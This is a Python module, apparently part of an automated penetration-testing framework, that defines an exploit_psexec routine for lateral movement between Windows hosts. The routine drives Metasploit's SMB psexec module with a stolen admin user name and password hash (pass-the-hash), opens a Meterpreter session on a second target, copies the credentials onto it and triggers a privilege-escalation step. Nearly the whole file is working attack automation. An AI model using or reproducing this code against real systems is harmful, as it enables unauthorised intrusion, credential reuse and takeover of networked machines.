# Module providing Traversal exploits
#
# Author: Daniel Crouch
# Date created: March 2020

import os
import re
import time
import subprocess
from pathlib import Path
from dotenv import load_dotenv
# global variables
import config

################################################################################
# Host traversal commands
################################################################################

class Traversal(object):
    """
    Defines a collection host traversal commands and exploits
    """
    def exploit_psexec(self, target_name1, target_name2, verbose=True):
        """
        SMB server access
        """
        target1 = config.TARGETS[target_name1]
        target2 = config.TARGETS[target_name2]
        target2.action_history.append("exploit_psexec")
        # setup exploit
        cmd = "use exploit/windows/smb/psexec"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False)
        cmd = "set RHOST " + target2.ip
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False)
        cmd = "set SMBUser " + target1.admin_user
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False)
        cmd = "set SMBPass " + target1.admin_hash
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False)
        # run exploit
        config.MSFCONSOLE.set_active_session()
        cmd = "exploit"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True, wait=5)
        print(msf_reply)
        # handle result
        for line in msf_reply.splitlines():
            if 'Meterpreter session' in line:
                words = line.split()
                target2.session_id = words[3]
                target2.admin_user = target1.admin_user
                target2.admin_hash = target1.admin_hash
                config.MSFCONSOLE.background_session(target_name2)
                print("[*] exploit successful, session id:", words[3])
                break
        # update user priviledges
        config.PRIVILEDGEESC.update_priviledes(target_name2)


#
